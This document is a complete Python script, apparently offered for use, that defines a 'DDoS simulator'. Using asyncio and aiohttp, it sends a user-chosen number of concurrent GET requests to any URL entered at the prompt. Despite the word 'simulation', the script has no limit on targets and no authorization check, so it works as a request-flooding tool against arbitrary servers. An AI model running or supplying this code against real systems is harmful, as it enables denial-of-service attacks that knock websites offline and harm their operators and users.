import asyncio
import aiohttp
import time

class DDosSimulator:
    def __init__(self, target_url, num_requests):
        """
        Initialize the DDoS simulator.

        :param target_url: The URL of the target server
        :param num_requests: Number of requests to send
        """
        self.target_url = target_url
        self.num_requests = num_requests

    async def send_request(self, session):
        """
        Send a single request to the target URL.

        :param session: The aiohttp session to use for the request
        """
        try:
            async with session.get(self.target_url) as response:
                print(f"Response status: {response.status}")
        except Exception as e:
            print(f"Request failed: {e}")

    async def run(self):
        """
        Run the DDoS simulation by sending multiple requests.
        """
        async with aiohttp.ClientSession() as session:
            tasks = [self.send_request(session) for _ in range(self.num_requests)]
            await asyncio.gather(*tasks)

def main():
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    num_requests = int(input("Enter the number of requests to send: "))

    simulator = DDosSimulator(target_url, num_requests)

    start_time = time.time()
    print(f"Starting DDoS simulation on {target_url} with {num_requests} requests...")
    asyncio.run(simulator.run())
    end_time = time.time()

    print(f"Simulation completed in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    main()
